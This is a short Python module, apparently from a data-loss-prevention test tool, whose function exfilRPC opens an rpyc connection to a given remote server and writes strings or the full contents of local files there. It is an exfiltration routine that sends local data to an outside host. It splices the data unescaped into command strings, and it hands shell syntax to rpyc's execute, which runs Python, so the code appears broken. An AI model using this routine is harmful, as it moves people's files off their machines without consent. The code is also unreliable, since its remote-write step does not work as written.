import logging
import rpyc

from utils.strings import genRandomFilename

# exfil data over RPC
def exfilRPC(server, port, data, File=False):
    logging.debug("Using RPC exfiltration")
    if not File:
        if isinstance(data, list):
            logging.debug("data is a list, converting to string")
            data = ','.join(data)
    try:
        logging.debug("making connection over RPC")
        conn = rpyc.classic.connect(server, port=port)
        logging.debug("RPC connection made")
        if File:
            logging.debug("data is a file")
            filename = data.split("\\")[-1]
            rb = open(data, "rb").read()
            logging.debug(f"writing file to remote host as dlpd_rpc_{filename}")
            conn.execute(f'printf "%b" "{rb}" > dlpd_rpc_{filename}')
        else:
            logging.debug("data is a string")
            logging.debug(f"writing data to remote host as dlpd_rpc_{genRandomFilename()}.txt")
            conn.execute(f'echo "{data}" >> dlpd_rpc_{genRandomFilename()}.txt')

        logging.debug("data exfiltration over RPC successful!")
        return True
    except Exception as e:
        logging.error(f"Failed to exfiltrate data over RPC: {e}")
        return False